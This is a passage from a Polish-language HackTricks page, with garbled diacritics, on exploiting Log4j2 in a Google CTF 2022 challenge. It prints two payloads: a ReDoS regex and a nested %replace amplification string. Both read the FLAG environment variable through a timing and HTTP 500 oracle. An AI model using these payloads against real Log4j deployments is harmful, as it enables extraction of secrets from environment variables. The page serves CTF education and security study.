Jak wspomniano w poprzedniej sekcji, **`%replace`** obsuguje **regexy**. Mo偶liwe jest wic u偶ycie adunku z [**strony ReDoS**](../regular-expression-denial-of-service-redos.md), aby spowodowa **przekroczenie czasu** w przypadku znalezienia flagi.\
Na przykad adunek taki jak `%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}` spowodowaby **przekroczenie czasu** w tym CTF.

W tym [**opisie**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/) zamiast u偶ywa ataku ReDoS, u偶yto **ataku amplifikacyjnego**, aby spowodowa r贸偶nic czasow w odpowiedzi:

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> Jeli flaga zaczyna si od `flagGuess`, caa flaga jest zastpowana 29 `#`-ami (u偶yem tego znaku, poniewa偶 prawdopodobnie nie bdzie czci flagi). **Ka偶dy z 29 `#`-贸w jest nastpnie zastpowany przez 54 `#`-y**. Proces ten powtarza si **6 razy**, co prowadzi do cznej liczby ` 29*54*54^6* =`` `` `**`96816014208`** **`#`-贸w!**
>
> Zastpienie tak wielu `#`-贸w spowoduje wywoanie 10-sekundowego limitu czasu aplikacji Flask, co z kolei skutkuje wysaniem kodu statusu HTTP 500 do u偶ytkownika. (Jeli flaga nie zaczyna si od `flagGuess`, otrzymamy kod statusu inny ni偶 500)

## Odnoniki

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)


{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si sztuczkami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
